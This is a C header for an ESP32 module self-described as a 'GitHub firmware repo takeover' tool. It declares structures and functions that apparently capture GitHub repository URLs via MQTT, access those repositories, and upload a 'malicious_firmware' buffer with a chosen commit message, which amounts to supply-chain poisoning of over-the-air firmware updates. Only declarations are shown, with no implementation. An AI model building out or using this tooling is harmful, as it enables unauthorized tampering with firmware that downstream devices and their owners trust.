/**
 * ota_github.h - GitHub firmware repo takeover
 */

#ifndef OTA_GITHUB_H
#define OTA_GITHUB_H

#include <stdbool.h>
#include <stdint.h>
#include "esp_err.h"
#include "cJSON.h"
#include "ota_common.h"

typedef struct {
    char wifi_ssid[33];
    char wifi_password[64];
    char mqtt_broker[96];
    uint16_t mqtt_port;
    char mqtt_username[48];
    char mqtt_password[48];
    char mqtt_client_id[24];
    char subscribe_topic[64];
    char gh_firmware_path[OTA_GH_PATH_LEN];
    char gh_branch[OTA_GH_BRANCH_LEN];
    char gh_commit_msg[64];
    int gh_captured_url_index;
    uint8_t *malicious_firmware;
    uint32_t malicious_firmware_size;
    uint32_t timeout_sec;
} ota_github_config_t;

typedef struct {
    bool active;
    bool timeout;
    bool uploaded;
    uint32_t github_urls;
    uint32_t elapsed_sec;
    char state[32];
    char error[64];
} ota_github_state_t;

void ota_github_init(void);
esp_err_t ota_github_start(const ota_github_config_t *cfg);
esp_err_t ota_github_stop(void);
bool ota_github_is_active(void);
const ota_github_state_t *ota_github_get_state(void);
cJSON *ota_github_get_status_json(void);

bool ota_github_parse_url(const char *url, ota_github_repo_t *out);
bool ota_github_access_repo(ota_github_repo_t *repo);
const char *ota_github_list_files(ota_github_repo_t *repo, const char *path);
bool ota_github_get_file_sha(ota_github_repo_t *repo, const char *file_path);
bool ota_github_upload_firmware(ota_github_repo_t *repo,
                                const uint8_t *firmware_data,
                                uint32_t firmware_size,
                                const char *target_path,
                                const char *commit_msg);
const char *ota_github_get_repo_json(void);
const char *ota_github_get_result_json(void);
const char *ota_github_get_urls_json(void);

#endif /* OTA_GITHUB_H */
